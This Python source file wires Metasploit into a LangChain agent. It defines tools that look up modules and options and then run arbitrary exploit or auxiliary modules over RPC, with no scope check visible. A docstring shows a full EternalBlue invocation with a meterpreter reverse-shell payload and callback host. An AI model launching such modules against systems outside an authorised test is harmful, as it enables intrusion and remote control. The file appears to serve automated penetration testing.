import logging
import re
import time
from typing import Optional, Tuple, List, Dict, Any

from pymetasploit3.msfrpc import MsfRpcClient
from langchain_core.tools import tool

from constants import *
from dao.sqlite.msf_sqlite import create_connection, check_existing_record
from utils.dao.sqlalchemy.db_manager.alchemy_manager import ManagerAlchemyDB
from utils.msf.classes import CustomMsfRpcClient
from utils.msf.data_compressor import DataCompressor

logger = logging.getLogger('exception_logger')
logger.setLevel(logging.WARNING)


def get_msf_sub_groups_list() -> List[str]:
    """
    Retrieves a list of unique 'sub_group' names from the 'module_auxiliary' table in the Metasploit database.

    This function interacts with a database through a manager class `ManagerAlchemyDB` to fetch distinct
    subgroups available in the 'module_auxiliary' table. It is designed to assist agents in organizing
    Metasploit modules by their respective subgroups for further processing or categorization in automated
    security testing workflows.

    Returns:
        List[str]: A list of unique subgroup names from the Metasploit database. Returns an empty list
        if there is an error during retrieval or if no subgroups are found.

    Raises:
        Exception: If there is a database connection failure or an issue with the query execution, the
        error is caught and logged, but the function will still return an empty list.
    """
    db_url: str = 'sqlite:///metasploit_data.db'
    try:
        manager_db = ManagerAlchemyDB(db_url)
        sub_groups = manager_db.get_sub_group_from_modules()
        return sub_groups
    except Exception as e:
        print(f"Failed to retrieve sub_group list: {e}")
        return []



@tool
def get_msf_exact_sub_group_modules_list(sub_group_name: str, db_url: str = 'sqlite:///metasploit_data.db')\
        -> List[Tuple[str, str]]:
    """
        Retrieves a list of modules filtered by a specific 'sub_group' from the 'module_auxiliary' table in the
        Metasploit database.

        This function helps agents retrieve Metasploit modules categorized under a specific subgroup, aiding in
        organizing and executing tasks during security testing. The `sub_group_name` should be formatted with
        slashes (e.g., 'auxiliary/admin').

        Args:
            sub_group_name (str): The subgroup to filter modules by, in the format 'category/name' (e.g., 'exploit/multi').
            db_url (str, optional): The database connection URL. Defaults to 'sqlite:///metasploit_data.db'.

        Returns:
            List[Tuple[str, str]]: A list of tuples containing the module name and description.
                                   Returns an empty list if no modules are found or if an error occurs.

        Raises:
            Exception: If there is an issue connecting to the database or executing the query, the function returns an empty list.
    """

    try:
        manager_db = ManagerAlchemyDB(db_url)
        modules: List[Tuple[str, str]] = manager_db.get_modules_by_sub_group(sub_group_name)
        return modules
    except Exception as e:
        print(f"Failed to retrieve modules for sub_group '{sub_group_name}': {e}")
        return []




@tool
def get_msf_module_options(module_name: str, db_url: str = 'sqlite:///metasploit_data.db') -> str:
    """
    Retrieves all non-null options for a given Metasploit module from the 'module_options_auxiliary' table.

    This function is intended for agents that need to extract and work with specific configuration options of
    Metasploit modules.

    Args:
        module_name (str): The name of the Metasploit module to retrieve options for.
        db_url (str, optional): The database connection URL. Defaults to 'sqlite:///metasploit_data.db'.

    Returns:
        str: A formatted string with the non-null option values for the specified module, or an empty string if
        an error occurs.
    """
    try:
        manager_db = ManagerAlchemyDB(db_url)
        # Retrieve module options and filter out null values
        modules = [module for module in manager_db.get_module_options(module_name) if module]
        # Format and return the options as a string
        return f'Configuration options for this module -> {module_name}: {", ".join(modules)}'
    except Exception as e:
        # Handle exceptions and print an error message
        print(f"Failed to retrieve options for module '{module_name}': {e}")
        return ''


@tool
def tool_based_on_metasploit(input_dict: Any) -> str:
    """
        Executes a specified Metasploit module via the RPC console interface and returns the compressed output.

        Args:
            input_dict (Any): A dictionary with 'module_category', 'module_name', and additional parameters.

            Example:
            {{
                'module_category': 'exploit',
                'module_name': 'windows/smb/ms17_010_eternalblue',
                'RHOSTS': '192.168.1.10',
                'PAYLOAD': 'windows/x64/meterpreter/reverse_tcp',
                'LHOST': '192.168.1.20',
                'LPORT': '4444'
            }}

        Returns:
            str: Compressed output from the Metasploit module execution, or an error message if execution fails.

        Raises:
            ValueError: If 'module_category' or 'module_name' is missing.
            Exception: For other errors during execution, returned as error messages.
    """


    try:
        # Process and standardize the input arguments
        args = _extract_string_parameters(input_dict)

        # Check if required arguments are present
        if 'module_category' not in args or 'module_name' not in args:
            raise ValueError("Both 'module_category' and 'module_name' are required.")

        # Extract and remove module_category and module_name from args
        module_category = args.pop('module_category')
        module_name = args.pop('module_name')

        # Get a host for inserting in the DB
        host: Optional[str] = None
        for host_name in HOST_NAMES_LIST:
            if host_name in args.keys():
                host = args.get(host_name)
                break
        if not host:
            logger.warning("Host is absent; other args will be added to the DB instead of the host.")
            host = '; '.join([f'{key}: {value}' for key, value in args.items()])

        # If mock mode is enabled, return mock execution results
        if MOCK_MSF_TOOLS and host:
            result = _mock_execution(module_category, module_name, host)
            if result and isinstance(result, str):
                return result

        # Execute the actual Metasploit module
        output = _execute_metasploit_module(module_category, module_name, args)

        # Split the output at the documentation line and take the part after it
        split_output = re.split(r'Metasploit Documentation: https://docs.metasploit.com/\n', output, maxsplit=1)
        filtered_output = split_output[1] if len(split_output) > 1 else ""

        # Compressing output data
        compressor = DataCompressor()
        compressor.start_compressing(filtered_output)
        compressed_output = compressor.get_compressed_output()

        # Save the results in the SQLite DB
        _save_results_db(
            module=f'{module_category}/{module_name}',
            host=host,
            output=filtered_output,
            compressed_output=compressed_output
        )

        return compressed_output

    except ValueError as e:
        return f"ValueError: {str(e)}"
    except Exception as e:
        logger.error(f"An unexpected error occurred during Metasploit module execution. {e}", exc_info=True)
        raise


def _extract_string_parameters(data: Dict[str, Any]) -> Dict[str, str]:
    """
    Recursively extracts all key-value pairs from the input dictionary
    where the value is a string, ignoring the nesting structure of the dictionary.

    Args:
        data (dict): The input dictionary, which can contain nested dictionaries.

    Returns:
        dict: A dictionary containing only the key-value pairs where the value is a string.
    """
    params = {}

    # Iterate through each key-value pair in the dictionary
    for k, v in data.items():
        # If the value is a string, add it to the result
        if isinstance(v, (int, float, bool, str)):
            params[k] = v
        # If the value is another dictionary, recursively process it
        elif isinstance(v, dict):
            params.update(_extract_string_parameters(v))

    return params



def _save_results_db(host: str, module: str, output: str, compressed_output: str) -> None:
    manager_db = ManagerAlchemyDB(db_url='sqlite:///my_sqlite.db')
    manager_db.write_to_db(
        host=host,
        module=module,
        output=output,
        compressed_output=compressed_output
    )


def _mock_execution(module_category: str, module_name: str, host: str) -> str:
    db_connection = create_connection()
    record = check_existing_record(db_connection, f'{module_category}/{module_name}', host)
    if record:
        return record[0]
    else:
        print("Mock execution: No existing record found.")


def _execute_metasploit_module(module_category: str, module_name: str, args: Dict[str, Any]) -> str:
    client: MsfRpcClient = CustomMsfRpcClient().get_client()
    current_console = client.consoles.console()

    try:
        commands = [f'use {module_category}/{module_name}']
        commands.extend(_build_module_commands(args))

        if module_category is 'exploit':
            commands.append('exploit')
        else:
            commands.append('run')

        command_str = '\n'.join(commands) + '\n'
        current_console.write(command_str)

        return _read_console_output(current_console, TIMEOUT)

    finally:
        current_console.destroy()


def _build_module_commands(args: Dict[str, Any]) -> list:
    return [f"set {key} {value}" for key, value in args.items()]


def _read_console_output(console, timeout: int = 300) -> str:
    start_time = time.time()
    output = ""
    while True:
        response = console.read()
        output += response['data']

        if any(phrase in output for phrase in EXECUTION_COMPLETION_PHRASES):
            break

        if time.time() - start_time > timeout:
            output += '[TIMEOUT] "Time limit exceeded, exiting the loop."'
            console.write('exit\n')
            break

        time.sleep(1)
    return output
